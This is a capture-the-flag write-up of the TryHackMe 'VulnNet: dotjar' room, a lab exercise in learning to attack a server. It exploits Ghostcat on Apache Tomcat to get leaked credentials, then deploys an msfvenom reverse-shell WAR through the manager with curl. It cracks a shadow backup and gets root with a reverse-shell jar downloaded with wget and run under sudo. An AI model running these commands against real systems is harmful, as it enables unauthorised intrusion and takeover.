---
title: Vulnet dotjar
layout: post
author: Bit Criminals Team
date: 2021-05-12 17:02:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/vulnnetdotjar
---

Let's start our daily routine nmap scan:

![](/images/dotjar1.png)

So, we get a 8009 port and a 8080 port on which Apache Tomcat is running.Well,the 8009 was new to me at least.

I then ran gobuster for port 8080 and here's what I got

![](/images/dotjar4.png)

After searching a bit,I finally found a help 
from my bestie-Google.I found a article about a exploit named **Ghostcat** CVE-2020-1938.

```
https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp
```

Then,I searched for this exploit with searchsploit and look I found a python script:multiple/webapps/48143.py 

![](/images/dotjar2.png)

Finally I ran the python script.

```python
python 48143.py <boxip>
```

![](/images/dotjar3.png)

and here we go.We get a username and a password ***webdev:Hgj3LA$02D$Fa@21***.That's what we wanted.

I tried to login to the /manager/ directory but it asked for username and password.I was able to login to /host-manager/ but it was of no help. 

Then,again I started to look for some exploits to hack the Tomcat apache server running in port 8080
and google again prove it's supremacy.

https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/

Reading this article I understood that we had to create a reverse shell and then upload it to port 8080.
I also understood that the exploit must be a war file.Here's what I came up with msfvenom. 

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=1234 -f war > shell.war
```

Then, I uploaded it with curl command as follows

```shell
curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war  "http://ip:8080/manager/text/deploy?path=/monshell"
```

Listening to the given port,1234 as given in the exploit in this case,I opened the /monshell/ directory in which I had uploaded the shell.

And,yes we get a shell and I was logged in as 'web'

![](/images/dotjar5.png)

After searching a bit we found a backup file of shadow in the /var/backups folder so we copied it to /tmp and gunzipped it to retrieve the shadow file.

![](/images/D4rkDemian/jar.png)

Then we cracked the password hash for jdk-admin using john and logged in as jdk-admin

![](/images/D4rkDemian/jar2.png)

Now we can view the user flag..

![](/images/D4rkDemian/jar3.png)

After doing **sudo -l** we found that we have root permissions to run any java file.

![](/images/D4rkDemian/jar4.png)

So we created an exploit using msfvenom 

```shell
msfvenom -p java/shell_reverse_tcp lhost=<local ip> lport=1234 -f jar -o pwn.jar

```
Then i opened a http-server and transferred the payload to the shell using wget 

![](/images/D4rkDemian/jar5.png)

```shell
python3 -m http.server 80
wget <local ip>/pwn.jar --output-document=pwn.jar
```
And opened a listening port 1234 in my terminal and ran the .jar file in the shell.Thus we got the root access 

```shell
sudo /usr/bin/java -jar pwn.jar
```
Now we can view the root flag as well!!

![](/images/D4rkDemian/jar6.png)




